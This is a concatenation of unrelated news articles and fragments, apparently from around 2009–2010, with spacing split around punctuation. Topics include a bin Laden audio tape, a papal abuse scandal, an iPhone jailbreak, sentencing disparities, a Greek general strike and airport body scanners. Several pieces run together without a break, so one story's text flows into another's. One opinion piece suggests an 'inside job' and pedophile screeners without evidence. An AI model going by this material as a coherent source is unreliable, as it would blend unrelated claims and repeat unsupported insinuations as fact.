A new audio tape allegedly from al Qaeda leader Osama bin Laden claims responsibility for an attempt to blow up a plane en route to Michigan on Christmas Day and warns the United States of more attacks .
The tape , which aired on the Arabic - language news Web site Al - Jazeera on Sunday , says " the United States will not dream of enjoying safety until we live it in reality in Palestine . "
The tape continues : " It is not fair to enjoy that kind of life while our brothers in Gaza live in the worst of miseries . "
CNN could not independently confirm the authenticity of the message , but the CIA has in the past confirmed Al - Jazeera reports on tapes from the al Qaeda leader .
President Obama 's senior adviser David Axelrod told CNN's " State of the Union " on Sunday that while there was no immediate confirmation that the message was authentic , it " contains the same hollow justification for the slaughter of innocent people . "
In another section of the audio tape that Al - Jazeera broadcast , the voice says : " God willing our attacks will continue as long as you support the Israelis and may peace be on those who follow guidance . "
Bin Laden also claims responsibility for the foiled attack on Delta flight 253 in December .
" The message intended to be sent to you was through the hero fighter Omar Farouq , may God release him , confirming an earlier message that the [ September ] 11th heroes delivered to you and it was repeated before and after [ that event ] , " he says .
A Nigerian man , Umar Farouk Abdulmutallab , has been charged with attempting to blow up the Delta Airlines plane as it approached Detroit from Amsterdam , Netherlands .
" Al Qaeda in the Arabian Peninsula was behind the failed attack on Christmas Day .
That 's clear , " a U.S. counterterrorism official -- who is not authorized to speak publicly -- told CNN .
" So a message like this -- no matter whose voice it may be -- should come as no surprise .
Al Qaeda has , from time to time , tried to build support for its program of murder by talking about the Palestinian issue .
That line 's never gotten them much in the past , and it 's unlikely to now , either . "
Bin Laden had six messages in 2009 .
The last was on September 25 and was " to the European people . "
In that message , he urged the countries to reconsider their involvement in the Afghanistan war .
" Today Europe is suffering an economic crisis , and its export reputation does n't hold true anymore , while America is bleeding economically because of all the wars it is involved in , " his last message said .
" Think about how Europe will fare when America pulls out of Afghanistan .
You will be left to suffer alone the rage of the people you oppressed . "
A security expert said there 's a possibility bin Laden did not know about the attempted attack in December and al Qaeda branches may be using it to prove themselves to the group 's leadership .
" They were able to get their man on an American plane on an American soil so it is successful by all means , " said Mustafa Al - Ani at the Gulf Research Center .
" The strategy is there , outlined by the mother leadership and now we will see the branches doing their best to please their leadership and implement al Qaeda vision in their own ways . "
Bin Laden is thought to be hiding in the Pakistan - Afghanistan mountain region , according to intelligence experts .

A County Durham man caught walking his lurcher through the window of his moving car has lost his licence .
Paul Railton , 23 , of Annfield Plain , admitted breaching two counts of the Road Traffic Act , at Consett Magistrates Court on Monday .
Police caught Railton driving his car with the dog lead attached through the window , after being alerted in Stoney Heap Lane by a cyclist .
Magistrates fined Railton a total of £ 124 and gave him three penalty points .
Railton was disqualified from driving for six months as he already had nine points on his licence , three for speeding and six for an insurance offence .
Under the totting up procedure , he had 12 points and had to be disqualified .
In mitigation , his solicitor , Paul Donoghue , said : " He accepts it was a silly thing to do , borne out with an element of laziness . "
He said Railton was driving slowly and that Stoney Heap Lane was a very quiet back - road .
A depressing week for Pope Benedict dramatically escalated last night into an unprecedented papal crisis when he was directly implicated in a cover -up of a German paedophile priest when he was Cardinal Archbishop of Munich 30 years ago .
The latest revelations are so potentially damaging to the reputation of then - Cardinal Joseph Ratzinger that speculation was mounting last night that they could severely , perhaps even irreparably , damage his moral authority as Pope Benedict XVI .
It was being speculated that the German Pope could conceivably have to recognise that his position as supreme pontiff could become untenable -- and do what was until now considered impossible , resign from the Petrine throne .
Dismay
Benedict got a first - hand readout of the scope of the scandal yesterday in his native land from the head of the German Bishop 's Conference , Archbishop Robert Zollitsch , who reported that the pontiff had expressed " great dismay and deep shock " over the scandal , but encouraged bishops to continue searching for the truth .
Less than a month after the Pope 's summit meeting in Rome with the Irish bishops , at which he ordered them to step united in line behind the papal throne , the abuse issue is no longer " an Irish problem " , as one senior Vatican cardinal crassly claimed .
Clerical child abuse is now a German problem .
It has become a Dutch problem .
It is also an Austrian problem .
This Europe - wide dimension , on top of similar scandals and cover-ups in the United States , the Philippines and Mexico , to name but a few , makes it Rome 's problem .
To paraphrase former US president Harry Truman , the buck stops on the Pope 's desk , as the spiritual leader of over one billion Catholics worldwide .
In the Pope 's homeland of Germany the number of alleged victims nationwide has soared to 300 since the scandals first broke last month in a Jesuit - run boarding school in Berlin .
The Dutch church has climbed to 350 complaints just a week after the Salesians first admitted they were investigating claims that three pupils in a school were abused in the 1960s .
In Austria , the Benedictine arch - abbot of St Peter 's in Salzburg has resigned after admitting he abused a 12 - year - old boy 40 years ago .
Worse still for Pope Benedict , the public spotlight has zoomed in on his older brother ( 86 ) , Monsignor Georg Ratzinger , who denies that the issue of sexual abuse came to his notice when he was master of Germany 's most illustrious group of choir boys in Regensburg from 1964 until 1994 .
A former singer in the choir has alleged it was well known among the boarders that a headmaster of the school , now dead , would summon two or three of the boys from their dormitories to come up to his room , where abuse would take place .
" The issue of sexual abuse never came up but if I had known with what exaggerated brutality he ( the former headmaster ) had proceeded , then I would have said something , " Mgr Georg said on Tuesday .
Questions
Questions are being asked about how the Pope dealt with abusive clergy when he was Cardinal Archbishop of Munich - Freising from 1977 to 1982 , before he moved to Rome to head the Congregation of the Doctrine of the Faith .
Cardinal Ratzinger 's central role in handling abuse cases as ' the Vatican Rotweiller ' has come back to haunt him as Pope Benedict , principally his 2001 confidential directive to bishops " on more serious crimes " .
This gave the Doctrinal Congregation control over how the church handles cases of sexual abuse of minors by priests .
This week Vatican spin-doctors robustly presented this directive as an important advance in making sure priest perverts were brought to justice .
The Vatican spokesman , Fr Frederico Lombardi , stressed it dealt with how canon law treated cases , and insisted this was not a substitute for civil law , which deals with the offence separately .
However , the media has interpreted the directive as a ban on bishops reporting serious accusations to civil authorities .
The rub is that a personal letter from Cardinal Ratzinger to bishops accompanying the 2001 document said complaints against paedophile priests were covered by " pontifical secret " , to be handled by bishops in strict confidentiality .
Thus , the charge of " cover - up " against the Pope .
The Irish bishops at their Wednesday news conference in Maynooth backed the Vatican interpretation and accused the media of misrepresentation of Benedict .
The Bishop of Dromore , John McAreavey , said it was clear to the bishops at their Rome summit that the 2001 letter " in no way precluded church authorities from their civil obligations , especially in regard to reporting and cooperating fully with the civil authorities . "
The Irish bishops may have made the wrong call .
Only hours after the Pope 's meeting with Cardinal Zollitsch , the world 's attention switched to his involvement in the ' Fr H' cover - up .
Benedict is now in the eye of the biggest sex abuse crisis to hit the Vatican .
Whether he can survive is doubtful -- if the Catholic Church he rules is also to survive .

Water and air .
So very commonplace are these substances , they hardly attract attention ―and yet they vouchsafe our very existence .
The beginnings of life are shrouded in myth : Let there [ be ] water and air .
Living phenomena spontaneously generated from water and air in the presence of light , though that could just as easily suggest random coincidence as a Deity .
Let ’s just say that there happened to be a planet with water and air in our solar system , and moreover at precisely the right distance from the sun for the temperatures required to coax forth life .
While hardly inconceivable that at least one such planet should exist in the vast reaches of universe , we search in vain for another similar example .
Mystery of mysteries , water and air are right there before us in the sea .
Every time I view the sea , I feel a calming sense of security , as if visiting my ancestral home ; I embark on a voyage of seeing .

CLEVELAND , Ohio --
Millions have passed through the Galleria at Erieview , sun glinting on its barrel - shaped glass roof .
But it took a nurseryman 's granddaughter to look up and think :
This place looks like a giant greenhouse .
Now Vicky Poole , the Galleria 's marketing and events director , who worked on her grandpa 's farm as a child , expects that by late spring or early summer , there will be fresh tomatoes for sale among the shops and galleries at the downtown Cleveland mall .
Very fresh -- as in vine - grown in bags and troughs hanging from steel stair banisters and ceiling beams in the shopping center that stretches between East Ninth and East 12th streets .
Poole got the idea last year when she spotted a photo of dozens of plants growing on a two - story window grid in a New York cafe .
" I said , ' That 's our food court . ' "
She was reminded of the picturesque glass rotunda in the Galleria 's food court that she often curtains off for wedding receptions .
Renting out party space is one of the ways Poole has found to make up for the Galleria 's losing many of its retail businesses .
" It 's not really a shopping mall anymore , " she said about the complex that opened in 1987 .
It was n't long until Poole and Jack Hamilton , whose Artist Review Today magazine office and gallery are in the Galleria , teamed up to form Gardens Under Glass , their name for a project they call an " urban eco village . "
This month , they were awarded a $ 30,000 start - up grant from Civic Innovation Lab .
Poole and Hamilton said the project is meant to be a bold statement about sustainability as well as a novel way to attract more people -- and their money -- to the mall .
" I know of no other urban garden in the country like this , " said Hamilton about Gardens Under Glass .
He hopes the project will grow every day .
Poole and Hamilton put in the first green stuff this week -- a 12 - foot cart of lettuce and other greens near the Galleria 's first - floor escalators .
Their aim is to start an education center and store in a former candy shop , invite sustainable - product makers to display and sell their items , and sell produce to restaurants and individuals .
They dream of hosting school groups and teams of volunteer urban gardeners eager to work beds of herbs and greens and vine systems raised hydroponically , aquaponically and in organic soils .
Their giant greenhouse idea has raised interest around town .
On Thursday , Poole gave a presentation to the Cleveland chapter of the American Institute of Chemical Engineers , composed of professionals and students .
" One of the students came up to me after and said , ' Have you ever considered growing aereoponically ? ' " said Poole .
" I invited him to come in and help me set up a system . "
Because of Ohio's short growing season and the fact that the Galleria will not be heated to greenhouse temperatures , Poole is focusing on easily raised greens , herbs and tomatoes .
That is good news for Saravanan Chandrababu , manager of Sweetwater 's Cafe Sausalito , a long - established Galleria restaurant .
He sells a lot of salads at lunchtime .
" I 'm very excited about the project , " said Chandrababu , who has already given a list of the herbs the restaurant uses to Poole .
He does n't foresee replacing the five vendors from whom he now buys large orders with Gardens Under Glass ' produce , which will be available only in small quantities at first .
But he 's interested in the novelty of mall - turned - greenhouse .
" We 'll try it , " Chandrababu said .
" We 'll advertise that it 's fresh .
Maybe that will bring more people to the Galleria . "
Michele and Mark Bishop , who operate Urban Organics from their Brunswick farm , will soon provide Sweet Peet , an organic mulch , as well as organic soils to Gardens Under Glass .
Meanwhile , Poole , 57 , and Hamilton , 44 , have collected products from other such vendors to grow the plants they are purchasing with grant money .
" So far , we have n't had to pay for a thing , " said Poole , who is also searching for a composting system that would take care of scraps from the food court .
Within two weeks , two portable 6 - by - 12 - foot beds will be installed on the first floor of the Galleria , where passers - by will watch greens grow .
" We 'll be propagating seeds for that this week , " said Poole .
By summer , she expects lush banister mountings of greens and tomatoes .
" It will be beautiful . "

Spanning 43 years , six television series , and eleven movies , the Star Trek universe can be daunting .
Here 's a guide to the best online resources to get you caught up before you see the movie .

Official Sources
We'd be remiss if we did n't start with the official Star Trek website , although it 's hardly the best resource out there .
Parts of the site seem completely deactivated , with even their news page barely updated past 2007 ( and call me crazy , but I 'd say there 's some Star Trek news to report at the moment ) .
Still , CBS has dozens of Original Series episodes available online , so Star Trek 's official web presence is n't a complete washout .
That said , it 's hardly surprising that if you really want to learn about Star Trek , you 've got to go to the fans .

General Reference
Wikipedia has a pretty decent Star Trek Portal that is a great starting point to explore their articles on the franchise .
But even Wikipedia can't hold a candle to Memory Alpha , the dedicated online encyclopedia for all things Trek .
The existence of Memory Alpha makes this list about a tenth as long as it would have been even a few years ago , as it covers pretty much every conceivable topic you could possibly imagine .
If you want to jump into the deep end of the Star Trek universe , a couple hours spent at Memory Alpha is pretty much the best way to start .
If that 's just not nerdy enough for you , there 's always Memory Beta , which exclusively covers all the stuff that does n't even officially exist in the Star Trek universe , like all the novels and comic books that have been written over the years .

Beginner 's Guide
Of course , all that information all in one place can get a little daunting , so you might want to step back for a refresher course .
Again , it 's got to be said that Star Trek 's Wikipedia page is a pretty good primer , tracing the show 's history from Gene Roddenberry 's initial ideas for the show to the new movie .
If you can get past the early 2000 's design , The Omega Quadrant is also a good place to go for a stripped down beginner 's guide to the show .
It carefully works through both the factual and fictional history of Star Trek , assuming no prior knowledge and taking the time to answer all the questions that tend to confuse non-fans ( like the legendary issue of what 's the difference between a Trekkie and a Trekker ) .

Episode Guides and Reviews
The official site , Memory Alpha , and Wikipedia all have fairly extensive episode guides , although TrekGuide is probably the best website specifically devoted to the topic , providing helpful charts that for instance list which aliens appear in which episodes .
If you 're looking for episode reviews , Jammer 's Reviews might be the gold standard , covering everything except the Animated Series ( he also looks at the new Battlestar Galactica and Gene Roddenberry 's other science fiction show , Andromeda ) .
Tim Lynch 's Reviews also have their charms , but he only covers parts of the 24th century shows ( TNG , DS9 , and Voyager ) , and none of The Original Series or Enterprise .
The always excellent AV Club is currently working through The Original Series , with weekly posts each reviewing two episodes ( they 're just starting up on season 2 ) .

Military Science and Technology
One topics on which Memory Alpha has n't made other sites obsolete is tech specs for the franchise 's starships .
Star Trek Intelligence is written as though it's , well , an intelligence report prepared for the Federation , compiling all known information about every ship from Xindi Reptilian Cruisers to Kazon Torpedo Ships and quite literally everything in between .
The Starship Schematic Database focuses more on visual records of the ships .
Either way , half an hour spent at one of these sites will get you ready for war , 23rd century style .

Toys and Collectibles
When just watching Star Trek is n't enough , it 's time to stock up on some toys , and there are certainly no shortage of options .
Both The Star Trek Toy Reference Center and Star Trek Toys
Online list pretty much every toy ever made from the sixties onward .
Toys Online wins based on aesthetics , but the Reference Center arguably has a more complete visual record , so I suppose it depends on what you care about looking at .
Still , Toys Online does have eBay links beneath all of its pages , so it 's the better option when you 're actually ready to start spending .

Costumes
Unfortunately , there really is n't a comprehensive guide to the world of Star Trek cosplay , but at least Star Trek Costumes offers a comprehensive catalog of Federation uniforms from every era .
If you 've ever wondered how diehard Trek fans manage to pull off authentic Klingon costumes , here 's the complete seven part process for making your very own Klingon forehead .

Conventions and Online Communities
Looking to meet up with your fellow fans ?
Though just about any science fiction convention is pretty much guaranteed to have a Star Trek presence , the franchise 's very own convention is Star Trek Las Vegas , which will be held in August with William Shatner and Leonard Nimoy already announced as attending .
There are also no end of online communities for Star Trek fans to get together , including United Federation of Trek ,
Trek Web , and Starfleet .
Finally , though it has n't launched yet , the massively multiplayer role - playing game Star Trek Online has already built a strong community as fans wait for the opportunity to explore the game 's 25th century setting .

Fan Fiction
Though it 's not for the faint of heart , Star Trek fan fiction offers the adventurous fan an opportunity to explore the universe in ways the official version has n't .
Star Trek Fan Fiction and Orion Press are two of the best , but I 'll leave it to you to locate some of the worst ( they 're certainly not hard to find ) .

Star
Trek is also notable for not just prose fan fiction but also a huge amount of fan films , some of which have taken the form of full - fledged amateur TV series .
Star Trek : Phase II , formerly The New Voyages , started as an attempt to complete the five - year mission of The Original Series , and has since morphed into a more open - ended continuation of Gene Roddenberry 's original ideas .
Although the show features the original characters played by new actors , both George Takei and Walter Koenig have appeared to reprise their roles as Sulu and Checkov , and Roddenberry 's son serves as a consulting producer .
Equally impressive is Star Trek : Hidden Frontier , which has made fifty full - length episodes depicting the voyages of the USS Excelsior in the Next Generation era .
Current Star
Trek rights owners CBS and Paramount rather awesomely tolerate unauthorized fan productions as long as the makers do n't profit from them .

Liger
Hybrid of : a male lion and a tigress
The Liger is currently the largest cat in the world , combining the wisdom and ferocious fighting abilities of Lion King ’s Mufasa with the cunningness and suaveness of Jungle Book ’s Shere Khan .
This feline perfect storm of beauty and badassness has been the result of animal captivity because nature is cruel like that and normally does n’t allow the two species to meet .
But in artificial environments of zoos and research facilities the two star crossed lovers could finally meet and sired the magnificent liger , the biggest of which alive today is “ Hercules ” from Miami , coming in at roughly 904 pounds .
The hugest liger in reported history however , weighted in at more than 1,759lb .
Interestingly enough , the liger is about the same size as the prehistoric American Lion , making the animal the closest thing to a real life Jurassic Park as we will ever get in the next couple of years .

Grolar Bear
Hybrid of : Grizzly and Polar bears
Once thought to only occur in captivity , the Grolar bear hybrid has been confirmed to exist naturally in the wild after a bunch of heartless bastards shot one in Northern Canada in 2006 .
If they did not get the death penalty there is no justice in this world …
The Grolar bear seems like a pretty impossible cross -breed .
Grizzlies prefer land while Polar bears thrive nicely on ice and water , but in certain inhabitable ice - cold parts of Canada ( you know , everything more than 200 miles from its southern border ) there are places where the two species can meet and furiously hump from time to time , giving birth to this awesome grayish teddy .
Size wise , the Grolar bear is somewhat larger than a Grizzly but smaller than a Polar bear , exhibiting characteristics of both , like a long neck ending with a bigger head , large claws and a smooth fur , making it look pretty much like a cartoon character .

Beefalo
Hybrid of : a cow and a bison
Better take notice here , because with the way things are now , soon the beefalo will be standard serving at all American households in place of regular beef .
The Beefalo has been appearing naturally in the US since the 18th century , and it was already in 1800 when we started to intentionally breed our cattle with the bison .
Unlike many cross-breeds , the beefalo is fertile , meaning it can produce its own offspring , making it perfect for future ranching .
The animal supposedly mixes in the very best traits of cattle and bison : its meat is as delicious as typical beef but also significantly lower in fat and cholesterol , like the bison .
If the breed will catch on it might completely replace regular cattle , ending in our hamburgers and steaks but killing us significantly slower .
The only downside is that the beefalo will basically wipe out the bison population , which will be completely bred out into beefalo and eaten if modern trends continue .
We should maybe hold a massive beefalo barbeque in their honor or something .

Geep
Chimera of : a sheep and a goat
The geep is not a hybrid .
A hybrid is what happens when 2 species bone until something vaguely different from each of them is born .
A chimera is most often the result of genetic experiments , what happens when you start combining genes at an embryo level , which is what happened in the geep ’s case .
The geep is the result of combining the DNA of a sheep and a goat in order to … that was never made clear actually , but if one was to take a guess the answer would probably be “ We wanted to see if it was possible ” .
Ah science , thanks for reminding us that one day you will doom us all .
The results of this chimerization vary greatly , occasionally producing a weird breed of hairy sheep or wooly goats , but even that eventually gets bred out in the geep ’s 2nd or 3rd generation .
Ultimately though , the geep is the result of bona fide mad sciencing , a real life genetic mutant , which could only get cooler if they bred a couple of eagle wings into it .

Defending you when your freedom is on the line .
George Hotz , famously known as the first hacker to unlock the iPhone , says he 's done it again .
The whiz kid on Thursday evening said he had cooked up a new hack for all iPhone OS devices , and he 's betting it will work on the iPad , too .
When the hack is released ( Hotz wo n't disclose a release date ) , it should be as simple to use as Blackra1n , Hotz 's one - click solution to jailbreak current iPhones , he said .
" It is completely untethered , works on all current tethered models ( ipt2 , 3gs , ipt3 ) , and will probably work on iPad too , " Hotz said in his blog post .
It 's plausible to believe that an iPhone OS jailbreak will also work for the iPad .
While the iPad will support apps that are exclusive to the device , its OS shares the same DNA as the iPhone's .
Hackers use the term " jailbreaking " to describe the act of overriding the iPhone ’s restrictions to install unauthorized software on the device .
Jailbreaking is the first step an iPhone owner must take in order to later unlock the handset , enabling it to work with a SIM card from any carrier .
Wired.com in November 2009 profiled Hotz , along with the community of hackers persistently issuing jailbreaks and mods to fight against Apple 's tight control of its iPhone .
The community also distributes unauthorized iPhone apps in a few underground app stores , the most popular of which is Cydia .
Hotz told Wired.com in a phone interview that he might release the hack when the iPad launches next week .
But he said he would wait to see what the rest of the hacking community does first .
He said he expects the Dev-Team , another group of iPhone hackers ( that Hotz was formerly part of ) , to have figured out the same exploit .
" We 'll see what the rest of the scene does , " Hotz said .
" Maybe I 'll release it [ during the iPad launch ] . "
A video of the new iPhone jailbreak in action is below the jump .
Updated noon PT with a statement from Hotz .

Macs in the enterprise are n't just cheaper to manage — they 're a lot cheaper , according to a new survey released today by the Enterprise Desktop Alliance .
Keep in mind that Enterprise Desktop Alliance is a group of software developers who've bandied together to deploy and manage Macs in the enterprise .
The group surveyed 260 IT administrators in large U.S. companies with both Macs and PCs who are involved in some degree with IT cost calculations .
Enterprise Desktop Alliance members include Centrify , Absolute Software , Group Logic , Web Help Desk , and most recently IBM .
[ Another Enterprise Desktop Alliance survey shows two out of three companies buying Macs this year , which will bring integration challenges for IT admins , CIO.com reports . ]
The survey found that Macs were cheaper in six of seven computer management categories : troubleshooting , help desk calls , system configuration , user training and supporting infrastructure ( servers , networks and printer ) .
Nearly half of the respondents cited software licensing fees as roughly the same for both platforms .
A whopping 65 percent of respondents said it costs less to troubleshoot Macs than PCs , 19 percent said they spent the same on both computers , and only 16 percent said they spent less to manage PCs than Macs .
Even more impressive , a majority of the respondents citing the low cost of Macs in nearly all categories said Macs were more than 20 percent cheaper to manage than PCs .
With Macs dominating in almost every cost category , why would 16 percent claim they spent less troubleshooting PCs ?
" It might be an [ issue ] of expertise of the IT staff , " says Tom Cromlin , spokesperson for the Enterprise Desktop Alliance .
" They 're probably more comfortable troubleshooting PCs . "
Enterprise Strategy Group analyst Jon Oltsik has another reason .
He says top execs often prefer Macs , and thus supporting those machines take on more importance .
" It 's not about managing [ Mac ] systems , which may be easier than Windows " on a machine - by - machines basis , Oltsik explains .
" It 's when the CEO wants IT to install software on his or her Mac , which will need immediate attention and take time away from other tasks . "
The cost of management appears to be a key driver for Macs in the enterprise .
Nearly half of respondents said they brought in Macs mainly because of their low total cost of ownership and ease of technical support .
In fact , many small companies with limited IT resources told CIO.com that they moved to Macs after getting fed up with costly PC support issues .
" Mac owners tend to do a lot of problem resolution themselves by communicating with other users , " Oltsik says .
One of the flaws of the survey is that it does n't factor in the cost of the PC or Mac itself , only the costs associated with managing the computers .
Macs , of course , cost more than most PCs .
However , many companies told CIO.com that the low cost of managing Macs more than makes up the cost difference between the computers .
Many , but not all .
" You can buy a PC for $ 400 , while the cheapest Mac is over a thousand , " Jon Graff , director of IT operations at A&E , told CIO.com last year ..
" In the real world , you 're spending a lot more on a Mac . "
While managing Macs may be cheaper than managing PCs , Macs pose their own special challenges as companies get up to speed supporting a Mac - PC environment .
According to another recent Enterprise Desktop Alliance survey , chief among those hurdles are : security and file sharing between operating systems , client management , backup and data recovery of Mac files , Active Directory integration , application compatibility , configuration consistency , cross- platform help desk and knowledge base support , and standard management utilities for both Macs and PCs .
Ben Hanes , senior systems administrator at Children 's Hospital of Oakland Research Institute , has been working through these issues for years .
On the troubleshooting front , Hanes only recently adopted a help desk system that lets his team troubleshoot Macs remotely from a PC .
There also might be hidden costs when managing Macs , warns Oltsik .
" In the past , you generally needed specialized tools to manage Macs , " he says .
" If this is the case , then you will have redundant tasks and management systems .
Another issue is skills , as you may need to hire or train a PC administrator on the Mac platform .
A Mac administrator may cost more than a PC administrator . "

Blacks , Latinos and immigrants receive longer prisons terms than others committing the same crimes , according to a new report issued last week by the United States Sentencing Commission .
The commission is headed by former FBI chief William K Sessions III .
The sentencing differential apparently arose after a recent loosening of federal sentencing guidelines in the wake of a Supreme Court ruling , the United States v. Booker that allows judges greater flexibility in imposing prison terms .
The study indicates that Black and Latino men receive sentences that are 10 and 7 percent longer than whites respectively .
Immigrants receive longer sentences than citizens , while college graduates serve less time those with high school diplomas or less .
The new trend apparently reverses progress in eliminating differentials .
The report ’s authors say the “ difference in sentence length declined steadily in fiscal years 2000 and 2001 .
By fiscal year 2002 , no statistically significant difference was observed in the sentences imposed on black offenders compared to white offenders .
No statistically significant difference between the sentences imposed on these two groups was observed again until after the Booker decision in January 2005 . ”
The cause of the problem remains unclear and the results should be treated with caution .
Conservatives have long favored mandatory sentencing .
“ People who commit similar crimes should receive similar sentences , ” said Rep. Lamar Smith of Texas , the ranking Republican on the House Judiciary Committee , reports the Kansas City Star .
The study comes as important steps are being made to eliminate differences in crack and powder cocaine sentencing .
In a rare bipartisan move , the Senate Judiciary Committee recently voted unanimously for significant reforms .
The Washington Post writes , “ The compromise would reduce the sentencing disparity to 18 to 1 for people caught with crack cocaine vs. those who carry the drug in powdered form .
The current ratio has rested since 1986 at 100 to 1 , disproportionately hurting African Americans , who are convicted of crack possession at far greater numbers . ”
Most important , the possession of crack cocaine would no longer carry a mandatory minimum , a first for the House and Senate to take such steps .
This represents an important victory for the Obama administration which promised to work to eliminate such disparities in sentencing which have contributed to the U.S. having the world largest prison population .
Today “ 2.3 million people are in jail or prison , and another 5 million are on parole , probation or other community sanctions .
This means that about 1 in every 31 American adults is under some form of correctional supervision–by far the highest rate in the world , ” Louisiana - based criminal attorneys Damico and Stockstill said in a recent press release applauding the Senate Judiciary Committee and its chair , Sen. Jim Webb of Virginia , for passing a bill that would create a “ blue - ribbon commission to study the justice system from top to bottom and propose much - needed reforms . ”
This blue ribbon panel , headed by Webb , is the first time a review and major overhaul of the criminal justice system is being considered since draconian measures imposed by Republicans in the late 1980s and 1990s .
During that period , mandatory sentencing of juveniles as adults became a major legal fad .
Currently 1,175 prisoners are servicing life sentences without parole after being sentenced as teenagers .
The Supreme Court is currently considering the legality of the GOP legislation .
Leticia Miranda of Colorlines writes , “ This June , the Supreme Court will decide whether young people can be sentenced to life without parole for crimes that did n’t result in a death .
Separately , several states are also considering abolishing life without parole for youth . ”
“ Olympus will prevail ! ” Pfft , please .
The beginning of God of War 3 starts off with Zeus proclaiming to his fellow Gods that Kratos and the Titans will not reign supreme over their kingdom .
But , little do they know that the Gods ’ former errand boy is knocking at their doorstep and ready to pounce .

We review eight important capacities that help us to be skillful in difficult and challenging situations involving speech and communication .
We then continue to explore how we might combine more " inner " and more " outer " responses , here focusing especially on " inner work " with difficult emotions ( we look at working with anger and fear ) , thoughts and narratives ( we look particularly at those connected with the judgmental mind ) , and body states .
A discussion follows the talk .
ATHENS ( Morning Star ) – Greece has been brought to a standstill by a general strike , with key union groups GSEE , ADEDY and PAME leading up to two million workers in a 24 - hour stoppage against the government ’s austerity program .
Tens of thousands of protestors filled Syntagma Square in the center of Athens and spilled out beyond , led by unions , activist groups , the Greek Communist Party ( KKE ) and Syriza , the smaller left coalition .
Beginning in the northern inner area of Athens around Omonia Square , the march came down Stadiou boulevard , taking more than an hour to reach the city center .
More than 40,000 protesters chanted “ We wo n’t pay for their crisis ” with radical songs blaring from speaker vans coming behind .
The strike shut down the entire public - sector infrastructure , including schools , airports , transport and government offices .
Hospitals were operating with skeleton crews , and many large shops and commercial enterprises closed .
Journalists also came out on strike , as did a wide range of self - employed people such as taxi drivers .
Though police fired tear gas at a separate anarchist contingent near Parliament , the event was largely peaceful and orderly .
However sources said the prospect of separate anarchist action later could not be ruled out , especially as an anti-fascist rally was planned in Amerikis Square , a neighbourhood dominated by supporters of the anti-immigrant LAOS party .
The strike and protests came as officials from the EU , the IMF and other financial bodies arrived in Athens at the invitation of Prime Minister Georgios Papandreou to advise on further efforts to impose austerity measures on the country , in a bid to restructure its economy in line with EU requirements .
On Monday night financial rating agency Fitch downgraded the ratings of the four major Greek banks , in response to what it said was the banks ’
“ weakening asset quality due to anticipated fiscal adjustments in Greece . ”
The decision will in turn raise yields on Greek bonds , further increasing the deficit .
“ We do n’t deny there is a crisis , ” KKE MP Yanis Ghiokas told the Morning Star .
“ However it is not our crisis and we should n’t pay for it .
“ While Papandreou has talked about tax evasion , the corporate tax rate has been lowered from 45 percent to 25 percent .
“ We want it raised back to make up the shortfall , and reduce reliance on indirect taxes . ”
Ghiokas also rejected widely publicized claims that Papandreou enjoys up to 70 percent support for the measures .
“ People are polled and they are asked ‘ does something need to be done , ’ and they say Yes .
That is then taken as support , ” he laughed ruefully .

This article originally appeared at Morning Star online .
The government plans to install in airports over the next two years 950 body scanners in a calculated over - reaction to the Christmas Day bomber 's attempts to light his shorts on fire , ( all after federal counterterrorism officials had begged off revocation of the bomber 's VISA despite him being a terror suspect , and despite the fact that he was allowed to get on the plane without a passport with the aid of a still unknown person ) .
Apparently not only will the scanners allow complete strangers to clearly see the naked bodies of your children and make them easy prey to any pedophiles who wish to infiltrate the TSA , but they 're also going to cause delays to travelers .
According to an article in USA Today titled , " Airport scanners stir fears over security lines " ( not " Airport scanners stir fears over loss of privacy ... or civil liberties " ) the new full body scanners take at least five times longer to scan a single passenger than a standard metal detector would .
So by simple logic passengers should expect it to take five times longer to get past security and therefore plan to be at the airport five times earlier than they would have been before .
All in the name of protecting them from any future bombers that the FBI might purposely allow onto their flights in a mystifying counter - terrorism strategy that screams of criminal incompetence or ... dare I say ... a possible " inside job " .
In a society of mostly vigilant , informed citizens in which a mainstream media puts more energy into spotlighting threats to freedom and the dangers of expanding federal power , and less into fear - mongering and reinforcing the message that an , ( at best ) , incompetent bureaucracy knows better than you , such a point would be minor .
However , the society described above hardly exists in America today , so despite everything else , the threat that the body scanners pose is re-framed as one of personal annoyance rather than personal dignity .
That the body scanners may cause delay is something that the TSA has noted , though a spokesman said the scanners will not " significantly increase " checkpoint lines .
Previously the public was assured that the body scanners could n't record the images of passengers .
Then it was revealed and confirmed surprisingly by CNN that body scanners could record the images while in " test mode " .
This week an Indian film star claimed that fans working at Heathrow airport printed out a naked scanner image for him to sign .
Heathrow responded by saying his story was " factually incorrect " since the scanners could n't record or print images , which challenges CNN 's story and makes the picture below of a printed body scanner image all the more baffling .

One of the greatest advocates for the use of body scanners is former Homeland Security Secretary , Michael Chertoff , who 's title seemed to give his opinion credibility to safety conscious citizens until a New York Times editor 's note revealed that Chertoff 's consulting company represents Rapiscan -- a manufacturer of the scanners .
Since people in government using their connections and influence to make money for themselves and their friends , even if it's at the expense of liberties ( and in the case of Cheney and Haliburton , people 's lives ) has become an acceptable form of corruption by a weary and apathetic public , the authority behind Chertoff 's recommendations is still superficially maintained by the opinion - shepherds on TV .
Often those who challenge the invasion of their privacy by machines like the body scanners are reassured that if they have nothing to hide then they have nothing to worry about .
In the case of the body scanners nearly everyone who gets on an airplane , ( with the exception of exhibitionists ) , has something to hide .
Forgetting for a moment the issue of the naked body images , the scanners show such personal accessories as back braces , maxipads , adult bladder control pads , and apparently fake breasts , according to Politics Daily author , Sandra Fish , who 's article also relates that a friend of herswas forced to lift his shirt to reveal his colostomy bag to TSA screeners .
Elderly travelers , who often face the stigma and ridicule of a youth obsessed culture , will now also face having to reveal the intimate details of their failing health to complete strangers or announce their personal ills before an audience of onlookers in order to avoid having to show what 's concealed beneath their clothes .
While some may argue it's a personal choice for an individual to fly , that presents quite a dilemma to a liberty - conscious 75 year old wanting to visit family in another state , having to decide between personal humiliation or a 26 hour bus ride , or 18 hour train ride .
Though , unlike the privacy issues , airport delays can be alleviated for the individual by reading a book or chatting with a friend , it is likely to be one that will be the most vocalized once the scanners are in place and part of the surveillance grid .
In a society of fast food , high speed internet , and cell phones , the common annoyances that come with traveling are usually the most harped upon .
But if the technology advances and Chertoff 's clients can figure out how to make the process of subjugation more timely and efficient , protests will most likely die down and America will timidly draw yet another line on the floor as it's backed further into the corner .
The governors of Michigan and Wisconsin met at the White House Monday to discuss the next steps in preventing the invasive Asian carp ’s potential entry into Lake Michigan from an Illinois shipping canal .
The Illinois governor , Pat Quinn , also participated in the meeting by teleconference .
